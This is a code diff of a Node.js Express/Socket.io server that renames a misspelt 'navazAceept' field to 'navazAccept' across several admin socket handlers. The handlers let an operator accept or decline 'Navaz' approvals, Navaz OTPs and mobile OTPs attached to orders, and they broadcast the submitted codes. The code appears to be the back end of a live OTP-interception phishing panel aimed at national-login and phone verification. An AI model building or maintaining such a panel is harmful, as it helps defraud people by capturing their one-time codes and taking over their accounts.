@@ -191,7 +191,7 @@ app.post("/phone/:id", async (req, res) => {
     checked: false,
     phoneAccept: false,
     networkAccept: false,
-    navazAceept: true,
+    navazAccept: true,
     navazOtpAccept: true,
   }).then(
     async () =>
@@ -414,14 +414,14 @@ io.on("connection", (socket) => {
   });
   socket.on("acceptNavaz", async (id) => {
     console.log("acceptNavaz From Admin", id);
-    await Order.findByIdAndUpdate(id, { navazAceept: true });
+    await Order.findByIdAndUpdate(id, { navazAccept: true });
     io.emit("acceptNavaz", id);
   });
 
   socket.on("declineNavaz", async (id) => {
     console.log("declineNavaz Form Admin", id);
     await Order.findByIdAndUpdate(id, {
-      navazAceept: true,
+      navazAccept: true,
       networkAccept: false,
     });
     io.emit("declineNavaz", id);
@@ -436,7 +436,7 @@ io.on("connection", (socket) => {
     await Order.findByIdAndUpdate(data.id, {
       navazOtpAccept: false,
       networkAccept: true,
-      navazAceept: true,
+      navazAccept: true,
     });
     io.emit("navazOtp", data);
   });
@@ -446,7 +446,7 @@ io.on("connection", (socket) => {
     await Order.findByIdAndUpdate(id, {
       navazOtpAccept: true,
       networkAccept: true,
-      navazAceept: true,
+      navazAccept: true,
     });
     io.emit("acceptNavazOTP", id);
   });
@@ -456,7 +456,7 @@ io.on("connection", (socket) => {
     await Order.findByIdAndUpdate(id, {
       navazOtpAccept: true,
       networkAccept: true,
-      navazAceept: true,
+      navazAccept: true,
     });
     io.emit("declineNavazOTP", id);
   });
@@ -467,7 +467,7 @@ io.on("connection", (socket) => {
       mobOtp: data.mobOtp,
       mobOtpAccept: false,
       networkAccept: true,
-      navazAceept: true,
+      navazAccept: true,
     });
     io.emit("mobOtp", data);
   });
@@ -477,7 +477,7 @@ io.on("connection", (socket) => {
     await Order.findByIdAndUpdate(id, {
       mobOtpAccept: true,
       networkAccept: true,
-      navazAceept: true,
+      navazAccept: true,
     });
     io.emit("acceptMobOtp", { id, price });
   });
@@ -487,7 +487,7 @@ io.on("connection", (socket) => {
     await Order.findByIdAndUpdate(id, {
       mobOtpAccept: true,
       networkAccept: true,
-      navazAceept: true,
+      navazAccept: true,
     });
     io.emit("declineMobOtp", id);
   });
